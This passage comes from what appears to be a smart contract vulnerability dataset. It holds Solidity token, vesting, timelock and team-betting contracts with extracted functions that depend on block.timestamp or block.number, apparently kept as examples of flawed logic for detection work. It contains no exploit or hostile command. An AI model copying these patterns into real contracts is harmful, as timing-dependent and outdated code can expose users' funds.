balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract FreezableMintableToken is FreezableToken, MintableToken {\n function mintAndFreeze(address _to, uint _amount, uint64 _until) onlyOwner canMint public returns (bool) {\n totalSupply = totalSupply.add(_amount);\n bytes32 currentKey = toKey(_to, _until);\n freezings[currentKey] = freezings[currentKey].add(_amount);\n freezingBalance[_to] = freezingBalance[_to].add(_amount);\n freeze(_to, _until);\n Mint(_to, _amount);\n Freezed(_to, _until, _amount);\n Transfer(msg.sender, _to, _amount);\n return true;\n }\n}\ncontract Consts {\n uint constant TOKEN_DECIMALS = 18;\n uint8 constant TOKEN_DECIMALS_UINT8 = 18;\n uint constant TOKEN_DECIMAL_MULTIPLIER = 10 ** TOKEN_DECIMALS;\n string constant TOKEN_NAME = \"OOO\";\n string constant TOKEN_SYMBOL = \"OOO\";\n bool constant PAUSED = false;\n address constant TARGET_USER = 0x085DA0829d1e2338F18312AA3FF872ff8053d355;\n bool constant CONTINUE_MINTING = true;\n}\ncontract ERC223Token is ERC223Basic, BasicToken, FailingERC223Receiver {\n using SafeMath for uint;\n function transfer(address _to, uint _value, bytes _data) public returns (bool) {\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength > 0) {\n ERC223Receiver receiver = ERC223Receiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n bytes memory empty;\n return transfer(_to, _value, empty);\n }\n}\ncontract MainToken is Consts, FreezableMintableToken, BurnableToken, Pausable\n{\n event Initialized();\n bool public initialized = false;\n function MainToken() public {\n init();\n transferOwnership(TARGET_USER);\n }\n function init() private {\n require(!initialized);\n initialized = true;\n if (PAUSED) {\n pause();\n }\n if (!CONTINUE_MINTING) {\n finishMinting();\n }\n Initialized();\n }\n function name() pure public returns (string _name) {\n return TOKEN_NAME;\n }\n function symbol() pure public returns (string _symbol) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure public returns (uint8 _decimals) {\n return TOKEN_DECIMALS_UINT8;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transferFrom(_from, _to, _value);\n }\n function transfer(address _to, uint256 _value) public returns (bool _success) {\n require(!paused);\n return super.transfer(_to, _value);\n }\n}",
  "extract_feature": [
    "function releaseOnce() public {\nbytes32 headKey = toKey(msg.sender, 0);\nuint64 head = chains[headKey];\nrequire(head != 0);\nrequire(uint64(block.timestamp) > head);\nbytes32 currentKey = toKey(msg.sender, head);\nuint64 next = chains[currentKey];\nuint amount = freezings[currentKey];\ndelete freezings[currentKey];\nbalances[msg.sender] = balances[msg.sender].add(amount);\nfreezingBalance[msg.sender] = freezingBalance[msg.sender].sub(amount);\nif (next == 0) {\ndelete chains[headKey];\n}\nelse {\nchains[headKey] = next;\ndelete chains[currentKey];\n}\nReleased(msg.sender, amount);\n}",
    "function releaseAll() public returns (uint tokens) {\nuint release;\nuint balance;\n(release, balance) = getFreezing(msg.sender, 0);\nwhile (release != 0 && block.timestamp > release) {\nreleaseOnce();\ntokens += balance;\n(release, balance) = getFreezing(msg.sender, 0);\n}\n}",
    "function freeze(address _to, uint64 _until) internal {\nrequire(_until > block.timestamp);\nbytes32 key = toKey(_to, _until);\nbytes32 parentKey = toKey(_to, uint64(0));\nuint64 next = chains[parentKey];\nif (next == 0) {\nchains[parentKey] = _until;\nreturn;\n}\nbytes32 nextKey = toKey(_to, next);\nuint parent;\nwhile (next != 0 && _until > next) {\nparent = next;\nparentKey = nextKey;\nnext = chains[nextKey];\nnextKey = toKey(_to, next);\n}\nif (_until == next) {\nreturn;\n}\nif (next != 0) {\nchains[key] = next;\n}\nchains[parentKey] = _until;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eb9"
  },
  "filename": "10189.sol",
  "content": "pragma solidity ^0.4.23;\ncontract NokuPricingPlan {\n function payFee(bytes32 serviceName, uint256 multiplier, address client) public returns(bool paid);\n function usageFee(bytes32 serviceName, uint256 multiplier) public constant returns(uint fee);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract NokuCustomToken is Ownable {\n event LogBurnFinished();\n event LogPricingPlanChanged(address indexed caller, address indexed pricingPlan);\n NokuPricingPlan public pricingPlan;\n address public serviceProvider;\n bool public burningFinished;\n modifier onlyServiceProvider() {\n require(msg.sender == serviceProvider, \"caller is not service provider\");\n _;\n }\n modifier canBurn() {\n require(!burningFinished, \"burning finished\");\n _;\n }\n constructor(address _pricingPlan, address _serviceProvider) internal {\n require(_pricingPlan != 0, \"_pricingPlan is zero\");\n require(_serviceProvider != 0, \"_serviceProvider is zero\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n serviceProvider = _serviceProvider;\n }\n function isCustomToken() public pure returns(bool isCustom) {\n return true;\n }\n function finishBurning() public onlyOwner canBurn returns(bool finished) {\n burningFinished = true;\n emit LogBurnFinished();\n return true;\n }\n function setPricingPlan(address _pricingPlan) public onlyServiceProvider {\n require(_pricingPlan != 0, \"_pricingPlan is 0\");\n require(_pricingPlan != address(pricingPlan), \"_pricingPlan == pricingPlan\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n emit LogPricingPlanChanged(msg.sender, _pricingPlan);\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract BurnableERC20 is ERC20 {\n function burn(uint256 amount) public returns (bool burned);\n}\ncontract NokuTokenBurner is Pausable {\n using SafeMath for uint256;\n event LogNokuTokenBurnerCreated(address indexed caller, address indexed wallet);\n event LogBurningPercentageChanged(address indexed caller, uint256 indexed burningPercentage);\n address public wallet;\n uint256 public burningPercentage;\n uint256 public burnedTokens;\n uint256 public transferredTokens;\n constructor(address _wallet) public {\n require(_wallet != address(0), \"_wallet is zero\");\n wallet = _wallet;\n burningPercentage = 100;\n emit LogNokuTokenBurnerCreated(msg.sender, _wallet);\n }\n function setBurningPercentage(uint256 _burningPercentage) public onlyOwner {\n require(0 <= _burningPercentage && _burningPercentage <= 100, \"_burningPercentage not in [0, 100]\");\n require(_burningPercentage != burningPercentage, \"_burningPercentage equal to current one\");\n burningPercentage = _burningPercentage;\n emit LogBurningPercentageChanged(msg.sender, _burningPercentage);\n }\n function tokenReceived(address _token, uint256 _amount) public whenNotPaused {\n require(_token != address(0), \"_token is zero\");\n require(_amount > 0, \"_amount is zero\");\n uint256 amountToBurn = _amount.mul(burningPercentage).div(100);\n if (amountToBurn > 0) {\n assert(BurnableERC20(_token).burn(amountToBurn));\n burnedTokens = burnedTokens.add(amountToBurn);\n }\n uint256 amountToTransfer = _amount.sub(amountToBurn);\n if (amountToTransfer > 0) {\n assert(BurnableERC20(_token).transfer(wallet, amountToTransfer));\n transferredTokens = transferredTokens.add(amountToTransfer);\n }\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract DetailedERC20 is ERC20 {\n string public name;\n string public symbol;\n uint8 public decimals;\n function DetailedERC20(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract TokenTimelock {\n using SafeERC20 for ERC20Basic;\n ERC20Basic public token;\n address public beneficiary;\n uint256 public releaseTime;\n function TokenTimelock(ERC20Basic _token, address _beneficiary, uint256 _releaseTime) public {\n require(_releaseTime > block.timestamp);\n token = _token;\n beneficiary = _beneficiary;\n releaseTime = _releaseTime;\n }\n function release() public {\n require(block.timestamp >= releaseTime);\n uint256 amount = token.balanceOf(this);\n require(amount > 0);\n token.safeTransfer(beneficiary, amount);\n }\n}\npragma solidity ^0.4.21;\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n function TokenVesting(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n bool _revocable\n )\n public\n {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n emit Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n token.safeTransfer(owner, refund);\n emit Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (block.timestamp < cliff) {\n return 0;\n } else if (block.timestamp >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n}\ncontract NokuCustomERC20 is NokuCustomToken, DetailedERC20, MintableToken, BurnableToken {\n using SafeMath for uint256;\n event LogNokuCustomERC20Created(\n address indexed caller,\n string indexed name,\n string indexed symbol,\n uint8 decimals,\n uint256 transferableFromBlock,\n uint256 lockEndBlock,\n address pricingPlan,\n address serviceProvider\n );\n event LogMintingFeeEnabledChanged(address indexed caller, bool indexed mintingFeeEnabled);\n event LogInformationChanged(address indexed caller, string name, string symbol);\n event LogTransferFeePaymentFinished(address indexed caller);\n event LogTransferFeePercentageChanged(address indexed caller, uint256 indexed transferFeePercentage);\n bool public mintingFeeEnabled;\n uint256 public transferableFromBlock;\n uint256 public lockEndBlock;\n mapping (address => uint256) public initiallyLockedBalanceOf;\n uint256 public transferFeePercentage;\n bool public transferFeePaymentFinished;\n bytes32 public constant BURN_SERVICE_NAME = \"NokuCustomERC20.burn\";\n bytes32 public constant MINT_SERVICE_NAME = \"NokuCustomERC20.mint\";\n modifier canTransfer(address _from, uint _value) {\n require(block.number >= transferableFromBlock, \"token not transferable\");\n if (block.number < lockEndBlock) {\n uint256 locked = lockedBalanceOf(_from);\n if (locked > 0) {\n uint256 newBalance = balanceOf(_from).sub(_value);\n require(newBalance >= locked, \"_value exceeds locked amount\");\n }\n }\n _;\n }\n constructor(\n string _name,\n string _symbol,\n uint8 _decimals,\n uint256 _transferableFromBlock,\n uint256 _lockEndBlock,\n address _pricingPlan,\n address _serviceProvider\n )\n NokuCustomToken(_pricingPlan, _serviceProvider)\n DetailedERC20(_name, _symbol, _decimals) public\n {\n require(bytes(_name).length > 0, \"_name is empty\");\n require(bytes(_symbol).length > 0, \"_symbol is empty\");\n require(_lockEndBlock >= _transferableFromBlock, \"_lockEndBlock lower than _transferableFromBlock\");\n transferableFromBlock = _transferableFromBlock;\n lockEndBlock = _lockEndBlock;\n mintingFeeEnabled = true;\n emit LogNokuCustomERC20Created(\n msg.sender,\n _name,\n _symbol,\n _decimals,\n _transferableFromBlock,\n _lockEndBlock,\n _pricingPlan,\n _serviceProvider\n );\n }\n function setMintingFeeEnabled(bool _mintingFeeEnabled) public onlyOwner returns(bool successful) {\n require(_mintingFeeEnabled != mintingFeeEnabled, \"_mintingFeeEnabled == mintingFeeEnabled\");\n mintingFeeEnabled = _mintingFeeEnabled;\n emit LogMintingFeeEnabledChanged(msg.sender, _mintingFeeEnabled);\n return true;\n }\n function setInformation(string _name, string _symbol) public onlyOwner returns(bool successful) {\n require(bytes(_name).length > 0, \"_name is empty\");\n require(bytes(_symbol).length > 0, \"_symbol is empty\");\n name = _name;\n symbol = _symbol;\n emit LogInformationChanged(msg.sender, _name, _symbol);\n return true;\n }\n function finishTransferFeePayment() public onlyOwner returns(bool finished) {\n require(!transferFeePaymentFinished, \"transfer fee finished\");\n transferFeePaymentFinished = true;\n emit LogTransferFeePaymentFinished(msg.sender);\n return true;\n }\n function setTransferFeePercentage(uint256 _transferFeePercentage) public onlyOwner {\n require(0 <= _transferFeePercentage && _transferFeePercentage <= 100, \"_transferFeePercentage not in [0, 100]\");\n require(_transferFeePercentage != transferFeePercentage, \"_transferFeePercentage equal to current value\");\n transferFeePercentage = _transferFeePercentage;\n emit LogTransferFeePercentageChanged(msg.sender, _transferFeePercentage);\n }\n function lockedBalanceOf(address _to) public constant returns(uint256 locked) {\n uint256 initiallyLocked = initiallyLockedBalanceOf[_to];\n if (block.number >= lockEndBlock) return 0;\n else if (block.number <= transferableFromBlock) return initiallyLocked;\n uint256 releaseForBlock = initiallyLocked.div(lockEndBlock.sub(transferableFromBlock));\n uint256 released = block.number.sub(transferableFromBlock).mul(releaseForBlock);\n return initiallyLocked.sub(released);\n }\n function transferFee(uint256 _value) public view returns(uint256 usageFee) {\n return _value.mul(transferFeePercentage).div(100);\n }\n function freeTransfer() public view returns (bool isTransferFree) {\n return transferFeePaymentFinished || transferFeePercentage == 0;\n }\n function transfer(address _to, uint256 _value) canTransfer(msg.sender, _value) public returns(bool transferred) {\n if (freeTransfer()) {\n return super.transfer(_to, _value);\n }\n else {\n uint256 usageFee = transferFee(_value);\n uint256 netValue = _value.sub(usageFee);\n bool feeTransferred = super.transfer(owner, usageFee);\n bool netValueTransferred = super.transfer(_to, netValue);\n return feeTransferred && netValueTransferred;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) canTransfer(_from, _value) public returns(bool transferred) {\n if (freeTransfer()) {\n return super.transferFrom(_from, _to, _value);\n }\n else {\n uint256 usageFee = transferFee(_value);\n uint256 netValue = _value.sub(usageFee);\n bool feeTransferred = super.transferFrom(_from, owner, usageFee);\n bool netValueTransferred = super.transferFrom(_from, _to, netValue);\n return feeTransferred && netValueTransferred;\n }\n }\n function burn(uint256 _amount) public canBurn {\n require(_amount > 0, \"_amount is zero\");\n super.burn(_amount);\n require(pricingPlan.payFee(BURN_SERVICE_NAME, _amount, msg.sender), \"burn fee failed\");\n }\n function mint(address _to, uint256 _amount) public onlyOwner canMint returns(bool minted) {\n require(_to != 0, \"_to is zero\");\n require(_amount > 0, \"_amount is zero\");\n super.mint(_to, _amount);\n if (mintingFeeEnabled) {\n require(pricingPlan.payFee(MINT_SERVICE_NAME, _amount, msg.sender), \"mint fee failed\");\n }\n return true;\n }\n function mintLocked(address _to, uint256 _amount) public onlyOwner canMint returns(bool minted) {\n initiallyLockedBalanceOf[_to] = initiallyLockedBalanceOf[_to].add(_amount);\n return mint(_to, _amount);\n }\n}\nlibrary AddressUtils {\n function isContract(address addr) internal view returns (bool) {\n uint256 size;\n assembly { size := extcodesize(addr) }\n return size > 0;\n }\n}\ncontract NokuCustomService is Pausable {\n using AddressUtils for address;\n event LogPricingPlanChanged(address indexed caller, address indexed pricingPlan);\n NokuPricingPlan public pricingPlan;\n constructor(address _pricingPlan) internal {\n require(_pricingPlan.isContract(), \"_pricingPlan is not contract\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n }\n function setPricingPlan(address _pricingPlan) public onlyOwner {\n require(_pricingPlan.isContract(), \"_pricingPlan is not contract\");\n require(NokuPricingPlan(_pricingPlan) != pricingPlan, \"_pricingPlan equal to current\");\n pricingPlan = NokuPricingPlan(_pricingPlan);\n emit LogPricingPlanChanged(msg.sender, _pricingPlan);\n }\n}\ncontract NokuCustomERC20Service is NokuCustomService {\n event LogNokuCustomERC20ServiceCreated(address caller, address indexed pricingPlan);\n uint256 public constant CREATE_AMOUNT = 1 * 10**18;\n uint8 public constant DECIMALS = 18;\n bytes32 public constant CUSTOM_ERC20_CREATE_SERVICE_NAME = \"NokuCustomERC20.create\";\n constructor(address _pricingPlan) NokuCustomService(_pricingPlan) public {\n emit LogNokuCustomERC20ServiceCreated(msg.sender, _pricingPlan);\n }\n function createCustomToken(string _name, string _symbol, uint8 ) public returns(NokuCustomERC20 customToken) {\n customToken = new NokuCustomERC20(\n _name,\n _symbol,\n DECIMALS,\n block.number,\n block.number,\n pricingPlan,\n owner\n );\n customToken.transferOwnership(msg.sender);\n require(pricingPlan.payFee(CUSTOM_ERC20_CREATE_SERVICE_NAME, CREATE_AMOUNT, msg.sender), \"fee payment failed\");\n }\n function createCustomToken(\n string _name,\n string _symbol,\n uint8 ,\n uint256 transferableFromBlock,\n uint256 lockEndBlock\n )\n public returns(NokuCustomERC20 customToken)\n {\n customToken = new NokuCustomERC20(\n _name,\n _symbol,\n DECIMALS,\n transferableFromBlock,\n lockEndBlock,\n pricingPlan,\n owner\n );\n customToken.transferOwnership(msg.sender);\n require(pricingPlan.payFee(CUSTOM_ERC20_CREATE_SERVICE_NAME, CREATE_AMOUNT, msg.sender), \"fee payment failed\");\n }\n}",
  "extract_feature": [
    "function TokenTimelock(ERC20Basic _token, address _beneficiary, uint256 _releaseTime) public {\nrequire(_releaseTime > block.timestamp);\ntoken = _token;\nbeneficiary = _beneficiary;\nreleaseTime = _releaseTime;\n}",
    "function release() public {\nrequire(block.timestamp >= releaseTime);\nuint256 amount = token.balanceOf(this);\nrequire(amount > 0);\ntoken.safeTransfer(beneficiary, amount);\n}",
    "function vestedAmount(ERC20Basic token) public view returns (uint256) {\nuint256 currentBalance = token.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released[token]);\nif (block.timestamp < cliff) {\nreturn 0;\n} else if (block.timestamp >= start.add(duration) || revoked[token]) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}",
    "function lockedBalanceOf(address _to) public constant returns(uint256 locked) {\nuint256 initiallyLocked = initiallyLockedBalanceOf[_to];\nif (block.number >= lockEndBlock) return 0;\nelse if (block.number <= transferableFromBlock) return initiallyLocked;\nuint256 releaseForBlock = initiallyLocked.div(lockEndBlock.sub(transferableFromBlock));\nuint256 released = block.number.sub(transferableFromBlock).mul(releaseForBlock);\nreturn initiallyLocked.sub(released);\n}",
    "function createCustomToken(string _name, string _symbol, uint8 ) public returns(NokuCustomERC20 customToken) {\ncustomToken = new NokuCustomERC20(\n_name,\n_symbol,\nDECIMALS,\nblock.number,\nblock.number,\npricingPlan,\nowner\n);\ncustomToken.transferOwnership(msg.sender);\nrequire(pricingPlan.payFee(CUSTOM_ERC20_CREATE_SERVICE_NAME, CREATE_AMOUNT, msg.sender), \"fee payment failed\");\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa7fa0e1460cdfa1eba"
  },
  "filename": "10233.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract StandardToken {\n using SafeMath for uint256;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n mapping(address => uint256) internal balances_;\n mapping(address => mapping(address => uint256)) internal allowed_;\n uint256 internal totalSupply_;\n string public name;\n string public symbol;\n uint8 public decimals;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances_[_owner];\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed_[_owner][_spender];\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances_[msg.sender]);\n balances_[msg.sender] = balances_[msg.sender].sub(_value);\n balances_[_to] = balances_[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances_[_from]);\n require(_value <= allowed_[_from][msg.sender]);\n balances_[_from] = balances_[_from].sub(_value);\n balances_[_to] = balances_[_to].add(_value);\n allowed_[_from][msg.sender] = allowed_[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed_[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n}\ncontract EthTeamContract is StandardToken, Ownable {\n event Buy(address indexed token, address indexed from, uint256 value, uint256 weiValue);\n event Sell(address indexed token, address indexed from, uint256 value, uint256 weiValue);\n event BeginGame(address indexed team1, address indexed team2, uint64 gameTime);\n event EndGame(address indexed team1, address indexed team2, uint8 gameResult);\n event ChangeStatus(address indexed team, uint8 status);\n uint256 public price;\n uint8 public status;\n uint64 public gameTime;\n uint64 public finishTime;\n address public feeOwner;\n address public gameOpponent;\n function EthTeamContract(\n string _teamName, string _teamSymbol, address _gameOpponent, uint64 _gameTime, uint64 _finishTime, address _feeOwner\n ) public {\n name = _teamName;\n symbol = _teamSymbol;\n decimals = 3;\n totalSupply_ = 0;\n price = 1 szabo;\n gameOpponent = _gameOpponent;\n gameTime = _gameTime;\n finishTime = _finishTime;\n feeOwner = _feeOwner;\n owner = msg.sender;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n if (_to != address(this)) {\n return super.transfer(_to, _value);\n }\n require(_value <= balances_[msg.sender] && status == 0);\n if (gameTime > 1514764800) {\n require(gameTime - 300 > block.timestamp);\n }\n balances_[msg.sender] = balances_[msg.sender].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n uint256 weiAmount = price.mul(_value);\n msg.sender.transfer(weiAmount);\n emit Transfer(msg.sender, _to, _value);\n emit Sell(_to, msg.sender, _value, weiAmount);\n return true;\n }\n function() payable public {\n require(status == 0 && price > 0);\n if (gameTime > 1514764800) {\n require(gameTime - 300 > block.timestamp);\n }\n uint256 amount = msg.value.div(price);\n balances_[msg.sender] = balances_[msg.sender].add(amount);\n totalSupply_ = totalSupply_.add(amount);\n emit Transfer(address(this), msg.sender, amount);\n emit Buy(address(this), msg.sender, amount, msg.value);\n }\n function changeStatus(uint8 _status) onlyOwner public {\n require(status != _status);\n status = _status;\n emit ChangeStatus(address(this), _status);\n }\n function finish() onlyOwner public {\n require(block.timestamp >= finishTime);\n feeOwner.transfer(address(this).balance);\n }\n function beginGame(address _gameOpponent, uint64 _gameTime) onlyOwner public {\n require(_gameOpponent != address(this));\n require(_gameTime == 0 || (_gameTime > 1514764800));\n gameOpponent = _gameOpponent;\n gameTime = _gameTime;\n status = 0;\n emit BeginGame(address(this), _gameOpponent, _gameTime);\n }\n function endGame(address _gameOpponent, uint8 _gameResult) onlyOwner public {\n require(gameOpponent != address(0) && gameOpponent == _gameOpponent);\n uint256 amount = address(this).balance;\n uint256 opAmount = gameOpponent.balance;\n require(_gameResult == 1 || (_gameResult == 2 && amount >= opAmount) || _gameResult == 3);\n EthTeamContract op = EthTeamContract(gameOpponent);\n if (_gameResult == 1) {\n if (amount > 0 && totalSupply_ > 0) {\n uint256 lostAmount = amount;\n if (op.totalSupply() > 0) {\n uint256 feeAmount = lostAmount.div(20);\n lostAmount = lostAmount.sub(feeAmount);\n feeOwner.transfer(feeAmount);\n op.transferFundAndEndGame.value(lostAmount)();\n } else {\n feeOwner.transfer(lostAmount);\n op.transferFundAndEndGame();\n }\n } else {\n op.transferFundAndEndGame();\n }\n } else if (_gameResult == 2) {\n if (amount > opAmount) {\n lostAmount = amount.sub(opAmount).div(2);\n if (op.totalSupply() > 0) {\n feeAmount = lostAmount.div(20);\n lostAmount = lostAmount.sub(feeAmount);\n feeOwner.transfer(feeAmount);\n op.transferFundAndEndGame.value(lostAmount)();\n } else {\n feeOwner.transfer(lostAmount);\n op.transferFundAndEndGame();\n }\n } else if (amount == opAmount) {\n op.transferFundAndEndGame();\n } else {\n revert();\n }\n } else if (_gameResult == 3) {\n op.transferFundAndEndGame();\n } else {\n revert();\n }\n endGameInternal();\n if (totalSupply_ > 0) {\n price = address(this).balance.div(totalSupply_);\n }\n emit EndGame(address(this), _gameOpponent, _gameResult);\n }\n function endGameInternal() private {\n gameOpponent = address(0);\n gameTime = 0;\n status = 0;\n }\n function transferFundAndEndGame() payable public {\n require(gameOpponent != 